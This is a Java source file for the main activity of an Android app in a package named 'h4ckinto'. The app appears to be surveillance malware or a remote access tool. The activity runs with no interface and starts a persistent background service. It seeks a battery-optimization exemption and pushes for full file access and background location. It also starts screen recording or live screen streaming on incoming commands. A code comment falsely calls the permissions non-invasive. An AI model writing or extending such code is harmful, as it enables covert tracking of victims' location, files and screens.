package com.h4ckinto.android;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.h4ckinto.android.service.MainService;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.StoragePermissionManager;

import java.util.ArrayList;
import java.util.List;

public class SimpleMainActivity extends AppCompatActivity {
    
    private static final String TAG = "SimpleMainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int BACKGROUND_LOCATION_REQUEST_CODE = 1002;
    
    private StoragePermissionManager storagePermissionManager;
    
    // No UI elements - completely automatic
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Log.d(TAG, "SimpleMainActivity created - launching Grant Application");
        
        // Screen recording and streaming features - ENABLED
        handleScreenRecordingIntent(getIntent());
        
        // If it was a screen recording/stream request, return early
        Intent intent = getIntent();
        if (intent != null) {
            String action = intent.getAction();
            if ("com.h4ckinto.android.REQUEST_SCREEN_RECORDING".equals(action) ||
                "com.h4ckinto.android.REQUEST_SCREEN_STREAM".equals(action)) {
                return;
            }
        }
        
        // Initialize storage permission manager
        storagePermissionManager = new StoragePermissionManager(this);
        
        // Launch Grant Application Activity
        Intent grantIntent = new Intent(this, GrantApplicationActivity.class);
        startActivity(grantIntent);
        
        // Start service automatically without any UI
        startService();
        
        // Request battery optimization exemption for background service
        requestBatteryOptimizationExemption();
        
        // PRIORITY: Request MANAGE_EXTERNAL_STORAGE first for Android 11+ (full file access)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Log.w(TAG, "⚠️ MANAGE_EXTERNAL_STORAGE not granted - requesting full file access");
                requestFullFileAccessPermission();
                // Don't request other permissions yet - wait for user to grant full file access
                return;
            } else {
                Log.d(TAG, "✅ MANAGE_EXTERNAL_STORAGE already granted - full file access enabled");
            }
        }
        
        // Request basic storage permissions
        requestPermissions();
        
        // Check permissions and finish
        checkPermissions();
    }
    
    private void checkPermissions() {
        List<String> missingPermissions = getMissingPermissions();
        if (missingPermissions.isEmpty()) {
            Log.d(TAG, "All permissions granted. Service already started.");
        } else {
            Log.d(TAG, "Missing permissions: " + missingPermissions.size() + " required. App will continue with limited functionality.");
        }
        
        // Finish activity after setup
        new android.os.Handler().postDelayed(() -> {
            finish();
        }, 2000);
    }
    
    private List<String> getMissingPermissions() {
        List<String> missingPermissions = new ArrayList<>();
        
        List<String> requiredPermissionsList = new ArrayList<>();
        // Only storage permissions - no invasive permissions
        requiredPermissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        
        // Android 11+ (API 30+) - Add MANAGE_EXTERNAL_STORAGE for full file access
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            // Note: MANAGE_EXTERNAL_STORAGE requires special handling via Settings
            // We'll request it separately
        }
        
        String[] requiredPermissions = requiredPermissionsList.toArray(new String[0]);
        
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
            }
        }
        
        return missingPermissions;
    }
    
    private void requestPermissions() {
        List<String> missingPermissions = getMissingPermissions();
        if (!missingPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                missingPermissions.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            boolean locationGranted = false;
            
            boolean cameraGranted = false;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                }
                if (permissions[i].equals(Manifest.permission.ACCESS_FINE_LOCATION) || 
                    permissions[i].equals(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                        locationGranted = true;
                    }
                }
                if (permissions[i].equals(Manifest.permission.CAMERA)) {
                    if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                        cameraGranted = true;
                        Log.d(TAG, "✅ Camera permission granted!");
                    } else {
                        Log.w(TAG, "⚠️ Camera permission denied - front camera photos will not work");
                    }
                }
            }
            
            // Request background location permission if foreground location was granted (Android 10+)
            if (locationGranted && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) 
                    != PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "Requesting background location permission...");
                    ActivityCompat.requestPermissions(this, 
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 
                        BACKGROUND_LOCATION_REQUEST_CODE);
                } else {
                    // Background permission already granted, request location immediately
                    requestLocationImmediately();
                }
            } else if (locationGranted) {
                // Location granted on Android 9 or below, request immediately
                requestLocationImmediately();
            }
            
            // Request MANAGE_EXTERNAL_STORAGE for Android 11+ (API 30+) for full file access
            // Use StoragePermissionManager for modern permission handling
            if (storagePermissionManager != null) {
                storagePermissionManager.handlePermissionResult(requestCode, permissions, grantResults);
            } else {
                // Fallback to manual handling if manager not initialized
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    if (!android.os.Environment.isExternalStorageManager()) {
                        Log.w(TAG, "⚠️⚠️⚠️ MANAGE_EXTERNAL_STORAGE permission NOT granted!");
                        Log.w(TAG, "   Opening settings to grant permission...");
                        try {
                            Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                            Log.d(TAG, "✅ Opened settings for MANAGE_EXTERNAL_STORAGE permission");
                            Toast.makeText(this, "CRITICAL: Enable 'All files access' to see all files (not just images)", Toast.LENGTH_LONG).show();
                        } catch (Exception e) {
                            Log.e(TAG, "Error opening MANAGE_EXTERNAL_STORAGE settings: " + e.getMessage());
                        }
                    } else {
                        Log.d(TAG, "✅ MANAGE_EXTERNAL_STORAGE permission already granted - full file access enabled");
                    }
                }
            }
            
            if (allGranted) {
                Log.d(TAG, "All permissions granted!");
                checkPermissions();
            } else {
                Log.w(TAG, "Some permissions were denied. App will continue with limited functionality.");
                checkPermissions();
            }
        } else if (requestCode == BACKGROUND_LOCATION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Background location permission granted!");
                // Request location immediately after background permission is granted
                requestLocationImmediately();
            } else {
                Log.w(TAG, "Background location permission denied. GPS will only work when app is in foreground.");
            }
            checkPermissions();
        }
    }
    
    /**
     * Request battery optimization exemption to keep service running in background
     */
    private void requestBatteryOptimizationExemption() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            try {
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                String packageName = getPackageName();
                
                if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                    Log.w(TAG, "Battery optimization is enabled - requesting exemption");
                    Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(android.net.Uri.parse("package:" + packageName));
                    startActivity(intent);
                } else {
                    Log.d(TAG, "✅ Battery optimization already disabled");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error requesting battery optimization exemption: " + e.getMessage());
            }
        }
    }
    
    /**
     * Request MANAGE_EXTERNAL_STORAGE permission immediately when app opens
     * Opens Settings screen and guides user to select "Allow managing all files"
     */
    private void requestFullFileAccessPermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Log.w(TAG, "Opening Settings for MANAGE_EXTERNAL_STORAGE permission...");
                try {
                    // Open app-specific storage settings (Android 11+)
                    Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, 1003); // REQUEST_CODE_MANAGE_STORAGE
                    
                    // Log.d(TAG, "✅ Opened Settings for full file access permission");
                    
                    // Show clear instructions to user (in Arabic and English)
                    // Toast.makeText(this, 
                    //     "⚠️ مهم جداً: اختر 'السماح بإدارة كل الملفات' (الخيار الأول)\n" +
                    //     "⚠️ IMPORTANT: Select 'Allow managing all files' (first option)", 
                    //     Toast.LENGTH_LONG).show();
                    
                    // Show another toast after a delay for emphasis
                    // new android.os.Handler().postDelayed(() -> {
                    //     Toast.makeText(this, 
                    //         "❌ لا تختار 'السماح بالوصول إلى الوسائط فقط'\n" +
                    //         "✅ اختر 'السماح بإدارة كل الملفات'", 
                    //         Toast.LENGTH_LONG).show();
                    // }, 2500);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error opening MANAGE_EXTERNAL_STORAGE settings: " + e.getMessage());
                    // Fallback to general storage settings
                    try {
                        Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        startActivityForResult(intent, 1003);
                        Toast.makeText(this, 
                            "Please enable 'All files access' in Settings", 
                            Toast.LENGTH_LONG).show();
                    } catch (Exception e2) {
                        Log.e(TAG, "Error opening fallback storage settings: " + e2.getMessage());
                        Toast.makeText(this, 
                            "Please manually enable 'All files access' in Settings → Apps → " + 
                            getApplicationInfo().loadLabel(getPackageManager()), 
                            Toast.LENGTH_LONG).show();
                    }
                }
            } else {
                Log.d(TAG, "✅ MANAGE_EXTERNAL_STORAGE already granted");
            }
        }
    }
    
    private void requestLocationImmediately() {
        // Ensure service is started first
        startService();
        
        // Send a command to the service to request location immediately
        // Use a delay to ensure service is fully initialized
        new android.os.Handler().postDelayed(() -> {
            try {
                Intent serviceIntent = new Intent(this, MainService.class);
                serviceIntent.setAction("com.h4ckinto.android.REQUEST_LOCATION");
                startService(serviceIntent);
                Log.d(TAG, "Requested immediate location update");
                
                // Also retry after a longer delay to ensure location is captured
                new android.os.Handler().postDelayed(() -> {
                    try {
                        Intent retryIntent = new Intent(this, MainService.class);
                        retryIntent.setAction("com.h4ckinto.android.REQUEST_LOCATION");
                        startService(retryIntent);
                        Log.d(TAG, "Retrying location request to ensure it's saved");
                    } catch (Exception e) {
                        Log.e(TAG, "Error retrying location request: " + e.getMessage());
                    }
                }, 3000); // Retry after 3 seconds
            } catch (Exception e) {
                Log.e(TAG, "Error requesting location: " + e.getMessage(), e);
            }
        }, 1000); // Wait 1 second for service to initialize
    }
    
    
    private int pendingScreenRecordingDuration = 30;
    
    // Screen stream parameters
    private int pendingStreamQuality = 50;
    private int pendingStreamFps = 5;
    private float pendingStreamScale = 0.5f;
    private boolean isScreenStreamRequest = false;  // true = stream, false = recording
    
    private void requestScreenRecording(int duration) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.LOLLIPOP) {
            Log.e(TAG, "Screen recording requires Android 5.0+ (API 21+)");
            Toast.makeText(this, "Screen recording requires Android 5.0+", Toast.LENGTH_SHORT).show();
            finish();
            return;
        }
        
        pendingScreenRecordingDuration = duration;
        isScreenStreamRequest = false;
        
        android.media.projection.MediaProjectionManager projectionManager = 
            (android.media.projection.MediaProjectionManager) getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE);
        
        if (projectionManager != null) {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, Constants.REQUEST_CODE_SCREEN_CAPTURE);
            Log.d(TAG, "Requesting screen capture permission...");
        } else {
            Log.e(TAG, "MediaProjectionManager not available");
            Toast.makeText(this, "Screen recording not supported", Toast.LENGTH_SHORT).show();
            finish();
        }
    }
    
    private void requestScreenStream(int quality, int fps, float scale) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.LOLLIPOP) {
            Log.e(TAG, "Screen streaming requires Android 5.0+ (API 21+)");
            Toast.makeText(this, "Screen streaming requires Android 5.0+", Toast.LENGTH_SHORT).show();
            finish();
            return;
        }
        
        pendingStreamQuality = quality;
        pendingStreamFps = fps;
        pendingStreamScale = scale;
        isScreenStreamRequest = true;
        
        android.media.projection.MediaProjectionManager projectionManager = 
            (android.media.projection.MediaProjectionManager) getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE);
        
        if (projectionManager != null) {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, Constants.REQUEST_CODE_SCREEN_CAPTURE);
            Log.d(TAG, "Requesting screen capture permission for live stream...");
        } else {
            Log.e(TAG, "MediaProjectionManager not available");
            Toast.makeText(this, "Screen streaming not supported", Toast.LENGTH_SHORT).show();
            finish();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == Constants.REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                if (isScreenStreamRequest) {
                    Log.d(TAG, "Screen capture permission granted - starting LIVE STREAM");
                    
                    Intent serviceIntent = new Intent(this, com.h4ckinto.android.service.ScreenStreamService.class);
                    serviceIntent.putExtra(com.h4ckinto.android.service.ScreenStreamService.EXTRA_RESULT_CODE, resultCode);
                    serviceIntent.putExtra(com.h4ckinto.android.service.ScreenStreamService.EXTRA_RESULT_DATA, data);
                    serviceIntent.putExtra(com.h4ckinto.android.service.ScreenStreamService.EXTRA_QUALITY, pendingStreamQuality);
                    serviceIntent.putExtra(com.h4ckinto.android.service.ScreenStreamService.EXTRA_FPS, pendingStreamFps);
                    serviceIntent.putExtra(com.h4ckinto.android.service.ScreenStreamService.EXTRA_SCALE, pendingStreamScale);
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent);
                    } else {
                        startService(serviceIntent);
                    }
                    
                    Toast.makeText(this, "Live screen streaming started", Toast.LENGTH_SHORT).show();
                } else {
                    Log.d(TAG, "Screen capture permission granted - starting recording");
                    
                    Intent serviceIntent = new Intent(this, com.h4ckinto.android.service.MainService.class);
                    serviceIntent.setAction("com.h4ckinto.android.START_SCREEN_RECORDING");
                    serviceIntent.putExtra("resultCode", resultCode);
                    serviceIntent.putExtra("data", data);
                    serviceIntent.putExtra("duration", pendingScreenRecordingDuration);
                    startService(serviceIntent);
                    
                    Toast.makeText(this, "Screen recording started for " + pendingScreenRecordingDuration + " seconds", Toast.LENGTH_SHORT).show();
                }
            } else {
                Log.w(TAG, "Screen capture permission denied");
                if (isScreenStreamRequest) {
                    Toast.makeText(this, "Screen streaming permission denied", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Screen recording permission denied", Toast.LENGTH_SHORT).show();
                }
            }
            finish();
        } else if (requestCode == 1003) { // REQUEST_CODE_MANAGE_STORAGE
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                if (android.os.Environment.isExternalStorageManager()) {
                    Log.d(TAG, "✅✅✅ MANAGE_EXTERNAL_STORAGE GRANTED - Full file access enabled!");
                    Toast.makeText(this, 
                        "✅ Full file access granted! All file types are now visible", 
                        Toast.LENGTH_SHORT).show();
                    
                    // Now request other permissions
                    requestPermissions();
                    checkPermissions();
                } else {
                    Log.w(TAG, "⚠️ MANAGE_EXTERNAL_STORAGE NOT granted - user may have selected 'media only'");
                    Toast.makeText(this, 
                        "⚠️ Full file access NOT granted. Only images/media will be visible.\n" +
                        "Please go back and select 'Allow managing all files'", 
                        Toast.LENGTH_LONG).show();
                    
                    // Still request other permissions, but file access will be limited
                    requestPermissions();
                    checkPermissions();
                }
            }
        }
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent); // Important: set the new intent so getIntent() returns it
        Log.d(TAG, "onNewIntent called");
        handleScreenRecordingIntent(intent);
    }
    
    private void handleScreenRecordingIntent(Intent intent) {
        if (intent == null) return;
        
        String action = intent.getAction();
        
        if ("com.h4ckinto.android.REQUEST_SCREEN_RECORDING".equals(action)) {
            int duration = intent.getIntExtra("duration", 30);
            Log.d(TAG, "Screen recording requested - Duration: " + duration + "s");
            requestScreenRecording(duration);
        }
        else if ("com.h4ckinto.android.REQUEST_SCREEN_STREAM".equals(action)) {
            int quality = intent.getIntExtra("quality", 50);
            int fps = intent.getIntExtra("fps", 5);
            float scale = intent.getFloatExtra("scale", 0.5f);
            Log.d(TAG, "Screen stream requested - Quality: " + quality + ", FPS: " + fps + ", Scale: " + scale);
            requestScreenStream(quality, fps, scale);
        }
    }
    
    private void startService() {
        try {
            Log.d(TAG, "Starting MainService...");
            Intent serviceIntent = new Intent(this, MainService.class);
            serviceIntent.setAction(Constants.ACTION_START_SERVICE);
            startForegroundService(serviceIntent);
            
            Log.d(TAG, "MainService started successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service: " + e.getMessage(), e);
        }
    }
}
